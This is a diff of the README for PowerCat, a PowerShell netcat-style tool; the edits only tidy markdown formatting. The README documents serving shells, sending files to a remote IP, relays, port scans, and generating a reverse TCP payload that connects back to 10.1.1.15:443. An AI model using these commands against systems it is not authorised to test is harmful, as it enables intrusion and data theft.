@@ -1,24 +1,23 @@
 PowerCat
-========
-######A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat.
-Inspired by: https://github.com/besimorhino/powercat
+====
+A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat<br/>Inspired by: https://github.com/besimorhino/powercat
+
 Installation
 ------------
 PowerCat is packaged as a PowerShell module.  You must import the module to use its functions.
-###
 ```powershell
     # Import the functions via the psd1 file:
     Import-Module PowerCat.psd1
 ```
-### Functions & Parameters:
+#### Functions & Parameters:
 ```powershell    
     Start-PowerCat # Starts a listener/server.
     
     -Mode           # Defaults to Tcp, can also specify Udp or Smb.
     -Port           # The port to listen on.
-	-PipeName       # Name of pipe to listen on.
+    -PipeName       # Name of pipe to listen on.
 	
-	-SslCn			# Common name for Ssl encrypting Tcp.
+    -SslCn			# Common name for Ssl encrypting Tcp.
     -Relay          # Format: "<Mode>:<Port/PipeName>"
     -Execute        # Execute a console process or powershell.
     -SendFile       # Filepath of file to send.
@@ -30,11 +29,11 @@ PowerCat is packaged as a PowerShell module.  You must import the module to use 
 	Connect-PowerCat # Connects a client to a listener/server.
 	
     -Mode           # Defaults to Tcp, can also specify Udp or Smb
-	-RemoteIp       # IPv4 address of host to connect to.
+    -RemoteIp       # IPv4 address of host to connect to.
     -Port           # The port to connect to.
-	-PipeName       # Name of pipe to connect to.
+    -PipeName       # Name of pipe to connect to.
 	
-	-SslCn			# Common name for Ssl encrypting Tcp.
+    -SslCn			# Common name for Ssl encrypting Tcp.
     -Relay          # Format: "<Mode>:<IP>:<Port/PipeName>"
     -Execute        # Execute a console process or powershell.
     -SendFile       # Filepath of file to send.
@@ -45,7 +44,6 @@ PowerCat is packaged as a PowerShell module.  You must import the module to use 
 Basic Connections
 -----------------------------------
 By default, PowerCat uses TCP and reads from / writes to the console.
-###
 ```powershell
     # Basic Listener:
     Start-PowerCat -Port 443
@@ -56,7 +54,6 @@ By default, PowerCat uses TCP and reads from / writes to the console.
 File Transfer
 -------------
 PowerCat can be used to transfer files using the -SendFile and -ReceiveFile parameters.
-###
 ```powershell
     # Send File:
     Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -SendFile C:\pathto\inputfile
@@ -67,7 +64,6 @@ PowerCat can be used to transfer files using the -SendFile and -ReceiveFile para
 Shells
 ------
 PowerCat can be used to send and serve (Power)Shells using the -Execute parameter.
-###
 ```powershell
     # Serve a shell:
     Start-PowerCat -Port 443 -Execute
@@ -78,7 +74,6 @@ PowerCat can be used to send and serve (Power)Shells using the -Execute paramete
 UDP and SMB
 -----------
 PowerCat supports more than sending data over TCP. 
-###
 ```powershell
     # Send Data Over UDP:
     Start-PowerCat -Mode Udp -Port 8000
@@ -89,7 +84,6 @@ PowerCat supports more than sending data over TCP.
 SSL
 -----------
 PowerCat generates X509 certificates on-the-fly to provide SSL encryption of TCP connections. 
-###
 ```powershell
 	# Admin privileges are required to generate the self-signed certificate.
 	
@@ -106,7 +100,6 @@ PowerCat generates X509 certificates on-the-fly to provide SSL encryption of TCP
 Relays
 ------
 Relays in PowerCat are similar to netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.
-###
 ```powershell
     # UDP Listener to TCP Client Relay:
     Start-PowerCat -Mode Udp -Port 8000 -Relay tcp:10.1.1.16:443
@@ -123,7 +116,6 @@ Relays in PowerCat are similar to netcat relays, but you don't have to create a 
 Generate Payloads
 -----------------
 Payloads can be generated using the New-PowerCatPayload function. 
-###
 ```powershell
     # Generate a reverse tcp payload that connects back to 10.1.1.15 port 443:
     New-PowerCatPayload -RemoteIp 10.1.1.15 -Port 443 -Execute 
@@ -134,7 +126,6 @@ Payloads can be generated using the New-PowerCatPayload function.
 Misc Usage
 ----------
 PowerCat can also perform port-scans, start persistent listeners, or act as a simple web server.
-###
 ```powershell
     # Basic TCP port scan:
     1..1024 | ForEach-Object { Connect-PowerCat -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose -Disconnect }
